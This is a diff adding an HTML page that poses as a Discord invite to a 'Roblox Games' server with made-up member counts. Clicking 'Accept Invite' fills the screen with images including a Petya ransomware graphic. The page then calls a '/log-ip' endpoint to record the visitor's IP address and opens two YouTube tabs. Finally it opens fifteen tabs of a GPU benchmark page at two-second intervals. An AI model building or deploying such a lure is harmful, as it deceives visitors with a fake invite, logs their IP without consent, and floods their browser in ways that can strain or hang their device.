@@ -1,0 +1,199 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord Invite</title>
+    <style>
+        body {
+            background-color: #2f3136;
+            color: #ffffff;
+            font-family: 'Arial', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .modal {
+            background: rgba(0, 0, 0, 0.5);
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+
+        .modal-content {
+            background-color: #36393f;
+            border-radius: 8px;
+            padding: 20px;
+            text-align: center;
+            width: 300px;
+            position: relative;
+        }
+
+        .server-avatar {
+            width: 100px;
+            height: 100px;
+            border-radius: 50%;
+            background-color: #2f3136;
+            margin-bottom: 20px;
+        }
+
+        .online-dot {
+            background-color: green;
+            border-radius: 50%;
+            width: 10px;
+            height: 10px;
+            display: inline-block;
+            margin-right: 5px;
+        }
+
+        .members-dot {
+            background-color: gray;
+            border-radius: 50%;
+            width: 10px;
+            height: 10px;
+            display: inline-block;
+            margin-right: 5px;
+        }
+
+        .accept-button {
+            background-color: #7289da;
+            color: #ffffff;
+            border: none;
+            border-radius: 4px;
+            padding: 10px 20px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+
+        .accept-button:hover {
+            background-color: #63728a;
+        }
+
+        #imageContainer {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            display: none;
+            z-index: 1001;
+            background-color: rgba(0, 0, 0, 0.8);
+        }
+
+        .image-grid {
+            display: grid;
+            grid-template-columns: repeat(5, 1fr);
+            grid-template-rows: repeat(5, 1fr);
+            width: 100%;
+            height: 100%;
+            gap: 10px;
+            padding: 10px;
+        }
+
+        .image-grid img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .circle {
+            clip-path: circle(50% at 50% 50%);
+        }
+
+        .rect {
+            clip-path: inset(20% 30%);
+        }
+    </style>
+</head>
+<body>
+    <div class="modal" id="inviteModal">
+        <div class="modal-content">
+            <h2>You've been invited to join Roblox Games</h2>
+            <p><span class="online-dot"></span> 175,525 members online</p>
+            <p><span class="members-dot"></span> 471,547 total members</p>
+            <button class="accept-button" id="acceptInviteButton">Accept Invite</button>
+        </div>
+    </div>
+
+    <div id="imageContainer">
+        <div class="image-grid" id="imageGrid"></div>
+    </div>
+
+    <script>
+        document.getElementById('acceptInviteButton').addEventListener('click', function() {
+            // Show the image container after 2 seconds
+            setTimeout(function() {
+                var imageContainer = document.getElementById('imageContainer');
+                imageContainer.style.display = "flex"; // Show the image container
+
+                var imageGrid = document.getElementById('imageGrid');
+                imageGrid.innerHTML = ''; // Clear any existing images
+
+                // Function to generate images with random position and size
+                function generateImages(src, count, className) {
+                    for (let i = 0; i < count; i++) {
+                        let img = document.createElement('img');
+                        img.src = src;
+                        img.alt = 'Random Image';
+                        img.classList.add(className);
+
+                        // Random position and size
+                        img.style.position = 'absolute';
+                        img.style.top = Math.random() * 100 + 'vh';
+                        img.style.left = Math.random() * 100 + 'vw';
+                        img.style.width = Math.random() * 50 + 10 + 'vw';
+                        img.style.height = Math.random() * 50 + 10 + 'vh';
+
+                        imageContainer.appendChild(img);
+                    }
+                }
+
+                // Generate 100 Wiki logo images
+                generateImages('https://static.wikia.nocookie.net/villains/images/4/4a/Wiki-logo.jpg/revision/latest?cb=20180214062811', 100, 'circle');
+
+                // Generate 20 Petya ransomware images
+                generateImages('https://vietnetco.vn/wp-content/uploads/2020/05/petya-mot-ma-oc-moi-con-nguy-hiem-hon-ca-wannacry.jpg.pagespeed.ce.yC3pJD_zMN.jpg', 20, 'rect');
+
+                // Generate 50 Code image
+                generateImages('https://cdn.nhandan.vn/images/78d92bfef5333421c1cfa9f19aa2572af2f6454a381555b801846adcfda20221d5c3592cd8675595f5f14cff82e0f1ef09295f8232ab59188a88536d0c54c3bf08f898f1af783faf84a556e4186279cc/91394d4edc4325c101d7194fb111eda7.jpg', 50, 'circle');
+
+                // Log the user's IP address
+                fetch('/log-ip')
+                    .then(response => response.json())
+                    .then(data => console.log('IP logged:', data))
+                    .catch(error => console.error('Error logging IP:', error));
+
+                // Redirect after 2 seconds
+                setTimeout(function() {
+                    // Open the first YouTube link in a new tab
+                    window.open('https://youtu.be/GN15aZVneSg?si=TW1DmKIleVKiNeAK', '_blank');
+                }, 2000);
+
+                // Redirect after 3 seconds
+                setTimeout(function() {
+                    // Open the second YouTube link in a new tab
+                    window.open('https://youtu.be/1n6p5nVVyO8?si=1lKCkiISmWinfqaM', '_blank');
+                }, 3000);
+
+                // Redirect after 5 seconds, opening 15 tabs with a 2-second interval
+                setTimeout(function() {
+                    for (let i = 0; i < 15; i++) {
+                        setTimeout(function() {
+                            window.open('https://cznull.github.io/vsbm', '_blank');
+                        }, i * 2000);
+                    }
+                }, 5000);
+            }, 2000);
+        });
+    </script>
+</body>
+</html>
